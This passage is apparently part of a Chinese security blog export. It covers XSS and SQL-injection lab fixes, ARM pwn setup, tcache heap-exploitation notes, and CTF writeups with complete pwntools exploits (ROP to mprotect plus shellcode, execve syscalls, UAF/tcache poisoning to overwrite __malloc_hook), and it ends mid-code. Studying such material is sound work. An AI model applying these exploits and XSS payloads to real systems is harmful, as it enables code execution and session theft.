4.避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。 5.严格执行数据库账号权限管理。 6.对用户敏感信息特别是密码做严格加密处理。 漏洞修复因为这个平台代码写的比较shi，本来想加上SQL预编译的，但是发现要改好多东西，所以就只针对漏洞点进行，修改。定位漏洞点，在info_show.php中 可以发现它直接用GET请求获得的参数进行SQL查询，对传入的参数并没有进行检查。所以我在这加入了一个检查，判断传入的参数是否为数字，如果不为数字，就强制转换成数字。 然后就ok了，补完洞了。再测试下，发现已经注入不了了。(也可能是我太菜了，才注不了，但是不管了，假装补上了) XSS跨站脚本攻击原理 攻击者在被攻击的Web服务器网页中嵌入恶意脚本，通常是用JavaScript编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。 类型 反射型 XSS 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 持久型 XSS 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 DOM XSS DOM-based XSS漏洞是基于文档对象模型Document Objeet Model 的一种漏洞。DOM是一个与平台、编程语言无关的借口，它允许程序或脚本动态的访问或者更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些事用户可以操作的.客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格的确认，就会产生DOM-based XSS漏洞。 漏洞复现平台 ： NPMserv 目标：NPMserv 中的博客网站 (本地搭的一个环境) 寻找漏洞点，这些博客的网站，xss一般存在于留言板中。而这个博客系统中每篇文章下都可以留言，并且有留言本。 先测试下文章的留言功能 发现输入的js代码被执行了，所以这里存在一个xss漏洞，并且是个反射型的xss漏洞 然后测试下留言本，很明显，这里也存在XSS漏洞，并且这个是个存储型的XSS漏洞，我输入的语句直接插入到网站上，只要用户访问了这个网站，那么我输入的代码就会被执行。 这个可以拿来做很多事情，比如 Cookie窃取 会话劫持 网页挂马 DOS和DDOS XSS蠕虫 简单演示下 Cookie窃取 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 嵌入网页 123&lt;iframe src= http://www.baidu.com width=400 height=300&gt;&lt;/iframe&gt;&lt;iframe src= http://www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt;可以通过设置嵌入网页的高宽来隐藏它 页面跳转 12&lt;script&gt;location=&quot;http://www.baidu.com&quot;&lt;/script&gt;#直接劫持页面 防御手段XSS攻击防御的核心思想就是对输入输出进行过滤和数据转义 过滤： 过滤不安全的标签，如script, style, link, iframe, frame。 过滤字符串中的 反斜杠 转义 针对&lt;、&gt;、/、’、”、&amp;五个字符进行实体化转义。 文章评论漏洞 漏洞修复：将$comment[‘content’] 的值经过htmlspecialchars函数处理，htmlspecialchars()函数可以把&amp; （和号）、“（双引号）、‘（单引号）、&lt;（小于）、&gt;（大于）这些敏感符号都转换为html实体。 测试，XSS漏洞修复了 留言版漏洞，这是一个存储型XSS漏洞，审查代码，定位漏洞点 可以发现它对提交的变量没有进行过滤就插入数据库了 漏洞修补：在add函数里加入htmlspecialchars函数，对传入的变量进行转义 然后就搞定了，之前的XSS漏洞不可以用了 reference： SQL注入攻击方式及防御方法，手把手入门白帽子 （二) CTF-Wiki]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arm-pwn环境搭建]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[最近打的比赛，做arm-pwn发现自己环境有点问题，就像新搭一个基于deepin系统的环境，下面记录下搭环境的过程 镜像 先装好deepin虚拟机，然后开始配环境 基本环境的安装 gdb-multiarch, git , vim, gdb ,binfmt 用来 识别文件格式 123sudo apt-get updatesudo apt-get install git gdb gdb-multiarch vimsudo apt-get install &quot;binfmt*&quot; 安装gef 12wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.pyecho source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit 安装pip，pwntools 12345wget https://bootstrap.pypa.io/get-pip.pysudo python get-pip.pysudo apt-get install python-devsudo pip install pwntools 安装qume 1sudo apt-get install qemu-user 然后环境基本就搞定了，剩下的共享库，需要安装什么就安装什么，我另一篇博客有讲过，这里就不讲了。 reference: D4rk3r 师傅的博客 M4X师傅]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【上海市大学生网络安全大赛】pwn复现]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 12zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped 这是一道aarch64的pwn题，我之前ubuntu的环境有点小问题，所以我配了一个deepin的环境搭建教程 安装下共享库 12345678zs0zrc@zs0zrc-PC:~/pwn/babyarm$ apt-cache search "libc6" | grep arm libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)zs0zrc@zs0zrc-PC:~/pwn/babyarm$ sudo apt-get install libc6-arm64-cross 用ida反编译了下文件，发现漏洞点很明显，就是一个栈溢出 123456789101112131415__int64 sub_400818()&#123; sub_400760(); write(1, "Name:", 5uLL); read(0, &amp;unk_411068, 0x200uLL); sub_4007F0(); return 0LL;&#125;ssize_t sub_4007F0()&#123; __int64 v1; // [xsp+10h] [xbp+10h] return read(0, &amp;v1, 0x200uLL); //stack overflow&#125; 程序先向bss段写入内容，然后再读取一个字符串，很明显这应该是用rop来做，但是我arm64的rop不是很会，arm64的汇编不是很懂，找不到gadget，就 …….. 这里看了大佬的writeup，发现是用rop做，先利用rop执行mprotect函数，设置bss段为可执行，往bss段写入shellcode，然后去执行shellcode来getshell 这里找的gadget类似于万用gadget 先学习下amd64常用汇编指令 123456789101112131415MOV X1，X0 ;将寄存器X0的值传送到寄存器X1ADD X0，X1，X2 ;寄存器X1和X2的值相加后传送到X0SUB X0，X1，X2 ;寄存器X1和X2的值相减后传送到X0AND X0，X0，#0xF ; X0的值与0xF相位与后的值传送到X0ORR X0，X0，#9 ; X0的值与9相位或后的值传送到X0EOR X0，X0，#0xF ; X0的值与0xF相异或后的值传送到X0LDR X5，[X6，#0x08] ；X6寄存器加0x08的和的地址值内的数据传送到X5STR X0, [SP, #0x8] ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间STP x29, x30, [sp, #0x10] ;入栈指令LDP x29, x30, [sp, #0x10] ;出栈指令CBZ ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）CMP ;比较指令，相当于SUBS，影响程序状态寄存器CPSR B/BL ;绝对跳转#imm， 返回地址保存到LR（X30）RET ;子程序返回指令，返回地址默认保存在LR（X30） 然后分析下这个gadget，通过loc_4008CC 函数，可以控制x19,x20,x21,x22,x23,x24,x29和x30寄存器的内容，而x30寄存器存储着返回地址，通过loc_4008AC函数，可以控制w0,x1,x2,x3寄存器的内容，并且可以执行call x3 12345678910111213141516loc_4008AC ; CODE XREF: sub_400868+60↓j LDR X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器 MOV X2, X22 ;将x22寄存器的内容赋给x2 MOV X1, X23 ;将x23寄存器的内容赋给x1 MOV W0, W24 ;将W24寄存器的内容赋给W0 ADD X19, X19, #1 ;x19寄存器加一 BLR X3 ；跳转到x3寄存器指向的地址 CMP X19, X20 ；比较x19和x20是否相等 B.NE loc_4008AC ；如果不相等，就跳回loc_4008AC继续执行loc_4008CC ; CODE XREF: sub_400868+3C↑j LDP X19, X20, [SP,#0x10] ;将sp+0x10,sp+0x18处的内容给x19,x20 LDP X21, X22, [SP,#0x20] ;将sp+0x20,sp+0x28处的内容给x21,x22 LDP X23, X24, [SP,#0x30] ;将sp+0x30,sp+0x38处的内容给x23,x24 LDP X29, X30, [SP],#0x40 ;将sp,sp+0x8处的内容给x29,x30 RET 布置好的栈如下，在执行完loc_4008CC 函数后，x30为loc_4008AC 的地址，所以程序会跳转到loc_4008AC 函数，会将x21寄存器的地址指向的内容赋给x3寄存器，然后将对应的参数放入x0,x1,x2寄存器中，接着会执行blr x3语句，这相当于 call x3，所以就会调用构造好的mprotect(0x411000,0x1000,0x5)函数，调用完mprotect函数后会将继续向下执行，比较x19和x20是否相等，这里提前构造好，使它们相等，然后继续向下执行。执行一连串的ldp指令后，将shellcode的地址赋给x30,那么最后就会ret到shellcode处去执行它。 12345678910111200:0000│ sp 0x40007ffe40 ◂— 0x0 --&gt; x2901:0008│ 0x40007ffe48 —▸ 0x4008ac ◂— ldr x3, [x21, x19, lsl #3] --&gt; x3002:0010│ 0x40007ffe50 ◂— 0x0 --&gt; x19 03:0018│ 0x40007ffe58 ◂— 0x1 --&gt; x2004:0020│ 0x40007ffe60 —▸ 0x411168 —▸ 0x400600 (mprotect@plt) --&gt; x21 --&gt;x305:0028│ 0x40007ffe68 ◂— 0x5 --&gt; x22 --&gt;x206:0030│ 0x40007ffe70 ◂— 0x1000 --&gt;x23 --&gt;x107:0038│ 0x40007ffe78 —▸ 0x411000 --&gt;x24--&gt;w008:0040│ 0x40007ffe80 ◂— 0x0 09:0048│ 0x40007ffe88 —▸ 0x411068 --&gt;下一个x30,shellcode的地址0a:0050│ 0x40007ffe90 ◂— 0xdeadbeef *6 ........... 这里用pwntools生成aarch64的shellcode会报错 解决方法(Ubuntu下) 1234$ sudo apt-get install software-properties-common$ sudo apt-add-repository ppa:pwntools/binutils$ sudo apt-get update$ sudo apt-get install binutils-aarch64-linux-gnu exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env pythonfrom pwn import *local=0debug = 0if local: p = remote("106.75.126.171","33865")elif debug: p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "pwn"]) else: p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "pwn"])elf = ELF("pwn")context.binary = "pwn"context.log_level = "debug"def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) buf = asm(shellcraft.aarch64.sh())buf = buf.ljust(0x100,'\x00')buf += p64(0x400600) #这里是存放mprotect函数的地址size = 72gadget1 = 0x4008CCgadget2 = 0x4008ACshellcode_add = 0x411068mprotect_add = 0x411168payload = cyclic(72) + flat([gadget1 , 0 , gadget2 , 0 , 1 , mprotect_add , 5 , 0x1000 , 0x411000 , 0 , shellcode_add] , [0xdeadbeef]*6)rc()sl(buf)sl(payload)p.interactive() momo_serve]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache下的堆利用的学习]]></title>
    <url>%2F2018%2F10%2F30%2F2018-10-30-tcache%E4%B8%8B%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近做国际赛的题，遇到了tcache下的堆利用，之前没有接触过tcache机制，所以就来学习一下，主要是围绕howtoheap来学习，做下笔记。 tcache机制是glibc-2.26新增的机制，主要是用来提升堆管理的性能，但是它的安全机制几乎没有….所以搞事就容易很多了，混子pwn手的福音 基础知识tcache的两个新增的结构体 12345678910typedef struct tcache_entry //tcache_entry 是用来链接chunk的结构体，*next指向下一个chunk的 &#123; //user data struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct //tcache的管理结构，一共有64项entries&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; 一些新增的宏 123456789101112131415//tcache新增的宏#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64 //tcache entries的数量# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1) //tcache的最大大小/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When "x" is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When "x" is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 //一个entry最多可以有7个chunk#endif 源码分析我就不写了，懒~，大佬们写的都很详细了 M4X大佬博客 P4nda大佬 tcache_poisoning通过覆盖tcache_entry中的 next指针，实现任意地址分配。因为tcache_get函数没有安全性检查机制 12345678910static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next;//基本什么检查都没有 --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; 源码： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123; size_t stack_var; fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&amp;stack_var); fprintf(stderr, "Allocating 1 buffer.\n"); intptr_t *a = malloc(128); fprintf(stderr, "malloc(128): %p\n", a); fprintf(stderr, "Freeing the buffer...\n"); free(a); fprintf(stderr, "Now the tcache list has [ %p ].\n", a); fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n" "to point to the location to control (%p).\n", sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, "1st malloc(128): %p\n", malloc(128)); fprintf(stderr, "Now the tcache list has [ %p ].\n", &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, "2nd malloc(128): %p\n", b); fprintf(stderr, "We got the control\n"); return 0;&#125; 运行结果： 123456789101112zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_poisoning The address we want malloc() to return is 0x7ffe8a1508e0.Allocating 1 buffer.malloc(128): 0x562bb17cd260Freeing the buffer...Now the tcache list has [ 0x562bb17cd260 ].We overwrite the first 8 bytes (fd/next pointer) of the data at 0x562bb17cd260to point to the location to control (0x7ffe8a1508e0).1st malloc(128): 0x562bb17cd260Now the tcache list has [ 0x7ffe8a1508e0 ].2nd malloc(128): 0x7ffe8a1508e0We got the control 这个程序先分配了一个大小128的chunk，然后将它free掉。此时这个chunk会被放入tcache中，然后修改它的next字段，修改为一个栈上变量的地址。最后在分配两次128大小的chunk，就可以控制栈上的内容了。 tcache_dup这个这是效果和double free差不多，但是比glibc_2.25版本简单，直接free两次就好了，因为tcache_put也没什么检查机制 123456789static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; how2heap例子 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n"); fprintf(stderr, "Allocating buffer.\n"); int *a = malloc(8); fprintf(stderr, "malloc(8): %p\n", a); fprintf(stderr, "Freeing twice...\n"); free(a); free(a); fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a); fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8)); return 0;&#125; 运行结果: 1234567zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_dup This file demonstrates a simple double-free attack with tcache.Allocating buffer.malloc(8): 0x5595e067f260Freeing twice...Now the free list has [ 0x5595e067f260, 0x5595e067f260 ].Next allocated buffers will be same: [ 0x5595e067f260, 0x5595e067f260 ]. free两次后tcache的情况 house_of_spirit这个主要是由于tcache_put函数没有对chunk的前后chunk的有效性进行检查，所以只要构造好本块对齐的chunk就可以free掉放入tcache中。 前提：(x64位下) ps：free掉的地址是伪造的chunk的user_data地址，和之前还是有点不同的 伪造的size&lt;= 0x410 malloc的大小 &lt;= 0x408 源码： 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region malloc(1);//init heap fake_chunks[1] = 0x40; // this is the size fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &amp;fake_chunks[1]); fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"); a = &amp;fake_chunks[2]; fprintf(stderr, "Freeing the overwritten pointer.\n"); free(a); fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));&#125; free掉伪造的chunk后堆的情况 reference: M4X’s blog P4nda CTF-WIKI tcache_source_code]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>housetoheap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BSides Delhi CTF 2018 writeup]]></title>
    <url>%2F2018%2F10%2F27%2F2018-10-27-BSides-Delhi-CTF-2018-writeup%2F</url>
    <content type="text"><![CDATA[easypeasy防护机制： 1234567☁ easy checksec easypeasy [*] &apos;/home/zs0zrc/pwn/ BSides/easy/easypeasy&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 简单的运行了下，好像是让我们输入寄存器的值，一直循环输入 简单逆向下，程序主要逻辑在child函数中。 12345678910111213141516171819202122232425262728293031323334353637383940414243void __noreturn child()&#123; __int64 buf[7]; // [rsp+0h] [rbp-40h] unsigned __int64 v1; // [rsp+38h] [rbp-8h] v1 = __readfsqword(0x28u); signal(14, (__sighandler_t)handler); while ( 1 ) &#123; do &#123; get_obj(buf); obj = buf[0]; qword_6010A8 = buf[1]; qword_6010B0 = buf[2]; qword_6010B8 = buf[3]; qword_6010C0 = buf[4]; qword_6010C8 = buf[5]; qword_6010D0 = buf[6]; &#125; while ( (unsigned int)validate_syscall_obj(buf[0]) ); raise(14); &#125;&#125;__int64 __fastcall get_obj(_QWORD *buf)&#123; printf("RAX: "); *buf = get_ll(); printf("RDI: "); buf[1] = get_ll(); printf("RSI: "); buf[2] = get_ll(); printf("RDX: "); buf[3] = get_ll(); printf("RCX: "); buf[4] = get_ll(); printf("R8: "); buf[5] = get_ll(); printf("R9: "); buf[6] = get_ll(); return 0LL;&#125; singal()函数声明void (signal(int sig, void (func)(int)))(int) ，第一个参数为要处理的信号，第二个参数为处理方法 raise()函数声明int raise(int sig) 这里参数为要发送的信号码，这个函数会促使生成信号sig 这里用signal函数给信号14也就是SIGALRM信号 设置了一个处理方法，然后循环读取寄存器的值，将这些值存入bss段上的变量中，每读取完一次后调用一次validate_syscall_obj函数，如果validate_syscall_obj函数返回值为0，就调用raise(14)函数,生成信号SIGALRM。然后就会调用handler函数，否则就进行下一次循环。如果想调用handler函数，那么rax的值就必须为1，2，3，60这四个数中的一个，或者是等30秒，程序调用alarm函数。 贴下linux支持的信号表： 12345678910111213141516171819202122Linux支持的信号列表如下。很多信号是与机器的体系结构相关的信号 信号值 默认处理动作 发出信号的原因SIGHUP 1 A 终端挂起或者控制进程终止SIGINT 2 A 键盘中断（如break键被按下）SIGQUIT 3 C 键盘的退出键被按下SIGILL 4 C 非法指令SIGABRT 6 C 由abort(3)发出的退出指令SIGFPE 8 C 浮点异常SIGKILL 9 AEF Kill信号SIGSEGV 11 C 无效的内存引用SIGPIPE 13 A 管道破裂: 写一个没有读端口的管道SIGALRM 14 A 由alarm(2)发出的信号SIGTERM 15 A 终止信号SIGUSR1 30,10,16 A 用户自定义信号1SIGUSR2 31,12,17 A 用户自定义信号2SIGCHLD 20,17,18 B 子进程结束信号SIGCONT 19,18,25 进程继续（曾被停止的进程）SIGSTOP 17,19,23 DEF 终止进程SIGTSTP 18,20,24 D 控制终端（tty）上按下停止键SIGTTIN 21,21,26 D 后台进程企图从控制终端读SIGTTOU 22,22,27 D 后台进程企图从控制终端写 handler函数 123456789101112131415161718192021222324252627void handler()&#123; exec_syscall_obj(&amp;obj);&#125;__int64 __fastcall exec_syscall_obj(_QWORD *a1)&#123; _QWORD *v1; // rbx __int64 result; // rax __int64 v3; // rdi __int64 v4; // rsi __int64 v5; // rdx __int64 v6; // rcx __int64 v7; // r8 __int64 v8; // r9 v1 = a1; result = *a1; v3 = a1[1]; v4 = v1[2]; v5 = v1[3]; v6 = v1[4]; v7 = v1[5]; v8 = v1[6]; __asm &#123; syscall; LINUX - &#125; return result;&#125;//exec_syscall_obj就是根据输入的寄存器的值执行了一次syscall 做法一: 构造execve(“/bin/sh”,0,0)的syscall来getshell 做法二： 构造open(),read(),write()这三个函数的系统调用，打开flag文件，读取flag，再打印出来 ps：这是我看大佬的writeup看到的 大佬博客地址 大佬都是手撕汇编的存在。tkbl open的系统调用号为 2，write的调用号为1，read的调用号为0 寄存器对应参数 open： rax-&gt; 0x2 ; rdi-&gt;pathname ; rsi​-&gt;flags read: rax-&gt;0x0 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count write: rax-&gt;0x1 ; rdi-&gt;fd ; rsi-&gt;buf ; rdx-&gt;count 先通过调用read的syscall将 pathname写入bss段，然后用open打开文件，再通过read将文件内容读到bss段，最后通过write打印出来 我用的是做法一： execve()的syscall rax : 0x3b rdi : address of “/bin/sh\x00” rsi : 0 rdx : 0 exp: 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./easypeasy') elf = ELF('./easypeasy')else: p = remote("35.200.228.122",1337) elf = ELF('./easypeasy')context.arch = elf.archcontext.log_level='debug' def register(rax,rdi,rsi,rdx,rcx,r8,r9): p.sendlineafter('RAX: ', rax) p.sendlineafter('RDI: ', rdi) p.sendlineafter('RSI: ', rsi) p.sendlineafter('RDX: ', rdx) p.sendlineafter('RCX: ', rcx) p.sendlineafter('R8: ', r8) p.sendlineafter('R9: ', r9)register(str(0x3b),str(0x6010A0 + 0x30),str(0x0),str(0x0),str(0),str(0),str(u64('/bin/sh\x00')))sleep(30) #这里sleep(30)的原因是为了等程序执行 alarm(0x1e)，产生SIGALRM信号p.interactive() canarysmash the stack，利用__stack_chk_failed函数，打印出flag exp： 123456789101112from pwn import*#p = process('./canary')p = remote("35.200.232.80","1337")context.log_level="debug"flag = 0x06010A0p.recv()payload = 'a'*0x178 + p64(flag)p.sendline(payload)p.recv()p.interactive() data_bank防护机制： 1234567☁ data_bank checksec data_bank [*] &apos;/home/zs0zrc/pwn/ BSides/data_bank/data_bank&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 这道题是一道堆的UAF的利用，但是libc版本是2.26，有tcache机制…….做的时候没有发现，虽然他给了libc文件，但是没有去检查libc的版本，下次一定记得去检查libc版本。而且不知道为什么我Ubuntu16.04不能运行他给的libc文件，所以我用的环境是Ubuntu18.04 程序一共有5个功能 add 新建一个chunk edit 编辑chunk delete free掉一个chunk，但是没有将指针置为空 view 将chunk的内容打印出来 exit 退出 漏洞点 1234567891011121314151617181920212223int delete()&#123; int result; // eax int v1; // eax signed int v2; // [rsp+Ch] [rbp-4h] puts("Enter the index:"); result = get_int(); v2 = result; while ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 6 ) &#123; if ( !table[v2] ) return puts("The index is empty"); v1 = count--; if ( v1 ) &#123; free(table[v2]);//存在UAF漏洞 return puts("done"); &#125; result = puts("Sorry no more removal\n"); &#125; return result;&#125; 利用思路： 先利用view功能泄露出libc地址，然后通过UAF 加上tcache_posion分配到包含_malloc_hook的chunk，修改 __malloc_hook为one_gadget，最后再malloc一个chunk触发 malloc_hook来getshell。这里要注意的是因为有tcache机制，所以要先将tcache填满，才可以泄露出地址。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import*context.log_level = "debug"p = process("./data_bank", env = &#123;'LD_PRELOAD': './libc.so.6'&#125;)elf = ELF('./data_bank')libc = ELF('./libc.so.6')def add(idx,size,data): p.sendlineafter("&gt;&gt; ","1") p.sendlineafter("Enter the index:\n",str(idx)) p.sendlineafter("Enter the size:\n",str(size)) p.sendlineafter("Enter data:\n",data) def delete(idx): p.sendlineafter("&gt;&gt; ","3") p.sendlineafter("Enter the index:\n",str(idx)) def edit(idx,data): p.sendlineafter("&gt;&gt; ","2") p.sendlineafter("Enter the index:\n",str(idx)) p.sendlineafter("Please update the data:\n",data) def show(idx): p.sendlineafter("&gt;&gt; ","4") p.sendlineafter("Enter the index:\n",str(idx)) add(0,0x80,'a'*0x80)add(1,0x80,'b'*0x80)for i in range(7): # 填满tcache delete(1)delete(0)show(0)p.recvuntil(":")leak = u64(p.recv(6).ljust(8,'\x00'))libc_base = leak - 0x3ebca0libc.address = libc_base__malloc_hook_add = libc.symbols['__malloc_hook']one_gadget = libc_base + 0x10a38clog.info("libc_address &#123;&#125;".format(hex(libc_base)))add(2,0x60,'a'*0x60)delete(2)edit(2,p64(__malloc_hook_add-0x13))add(3,0x60,"b"*0x60)add(4,0x60,'a'*0x13 + p64(one_gadget))log.info("get shell")p.sendlineafter('&gt;&gt; ', '1')p.sendlineafter('Enter the index:\n', '5')p.sendlineafter('Enter the size:\n', '0')p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HitconCTF 复现]]></title>
    <url>%2F2018%2F10%2F23%2F2018-10-23-HitconCTF-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[toooo这道题是我在苦逼的写完了社会实践报告后刷D4rk3r大佬的博客看到的，感觉很有意思，就先看了这道题 这题是一道arm的pwn，可是它被分类到了misc，可能大佬觉得这是脑洞题吧 查看了下程序的架构 12☁ tooooo file tooooo tooooo: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=9e7e0f87a22c5b75cb0926d54d3d3f33fbac1fad, stripped 这是一道arm64的题，先配置下虚拟机的环境 12345☁ tooooo apt-cache search &quot;libc6&quot; | grep arm64libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling) ☁ tooooo sudo apt-get install libc6-arm64-cross 因为题目给了libc文件和ld所以用题目给的就行了，运行前需要将ld-2.27.so重命名为ld-linux-aarch64.so.1 以及将libc-2.27.so重命名为libc.so.6 12将重命名的文件放入lib文件夹，lib文件夹放在和程序同个目录下qemu-aarch64 -L ./ tooooo 简单运行下发现它打印出了一个地址，然后要输入一个字符串，最后在打印一个字符串退出了 1234☁ tooooo qemu-aarch64 -L ./ tooooo 0x40009b1560fasdfToo many :) 用ida查看了下反编译的伪代码 1234567891011121314151617181920212223242526__int64 vuln()&#123; unsigned int v1; // [xsp+18h] [xbp+18h] __int64 v2; // [xsp+20h] [xbp+20h] void (__fastcall *v3)(_QWORD, __int64, __int64, __int64); // [xsp+28h] [xbp+28h] __int64 v4; // [xsp+30h] [xbp+30h] __int64 v5; // [xsp+38h] [xbp+38h] v3 = &amp;unk_F40; init_fuc(); v1 = open("/dev/urandom", 0LL); if ( (v1 &amp; 0x80000000) != 0 ) _exit(0xFFFFFFFFLL); v2 = 0LL; if ( read(v1, &amp;v2, 4LL) &lt;= 0 ) return v5 ^ _stack_chk_guard; printf("0x%llx\n", stdout); v4 = mmap(v2 &amp; 0x7FFFF000, 12288LL, 3LL, 34LL, 0xFFFFFFFFLL, 0LL); if ( v4 == -1 ) _exit(0xFFFFFFFFLL); if ( read(v1, v4, 12288LL) &lt;= 0 ) _exit(4294967294LL); get_string(&amp;unk_12018, 0x30u); v3(v1, v4 + 